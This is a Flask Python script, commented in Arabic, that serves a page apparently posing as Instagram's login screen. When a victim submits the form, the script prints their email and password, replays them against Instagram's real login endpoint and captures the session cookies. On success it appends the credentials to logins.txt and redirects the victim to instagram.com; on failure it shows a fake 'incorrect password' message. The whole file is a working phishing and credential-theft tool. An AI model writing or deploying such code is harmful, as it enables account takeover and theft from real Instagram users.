from flask import Flask, render_template, request, redirect, make_response
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # الحصول على قيمة الـ User-Agent من الطلب
    user_agent = request.headers.get('User-Agent').lower()

    # تحديد ما إذا كان المستخدم يستخدم جهاز لاب توب أو تليفون
    if 'mobile' in user_agent:
        # إذا كان التليفون، نعرض ملفات الهاتف
        return render_template('mobile.html')
    else:
        # إذا كان اللاب توب، نعرض ملفات اللاب
        return render_template('index.html')

other_site_url = "https://www.instagram.com/"

def favicon():
    return app.send_static_file('favicon.ico')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    print(f"Email: {email}, Password: {password}")
    USERNAME = f"{email}"
    PASSWORD = f"{password}"

    LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"

    session = requests.Session()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "X-CSRFToken": "missing",
        "Referer": "https://www.instagram.com/accounts/login/"
    }

    response = session.get("https://www.instagram.com/", headers=headers)
    csrf_token = response.cookies.get_dict().get("csrftoken", "")
    headers["X-CSRFToken"] = csrf_token

    login_data = {
        "username": USERNAME,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{PASSWORD}",
        "queryParams": {},
        "optIntoOneTap": "false"
    }

    login_response = session.post(LOGIN_URL, data=login_data, headers=headers)

    print(login_response.status_code)
    if login_response.status_code == 200 and login_response.json().get("authenticated"):
        print("✅ تسجيل الدخول ناجح!")
        cookies = session.cookies.get_dict()
        print("📌 كوكيز الجلسة:", cookies)
        resp = make_response(redirect(other_site_url))
        for cookie_name, cookie_value in cookies.items():
            resp.set_cookie(cookie_name, cookie_value)
        with open("logins.txt", "a") as file:
            file.write(f"{email}, {password}\n")
            
        return resp
    else:
        print("❌ فشل تسجيل الدخول:", login_response.text)
        return render_template("index.html", error="Sorry, your password was incorrect. Please double-check your password.")

if __name__ == '__main__':
    app.run()
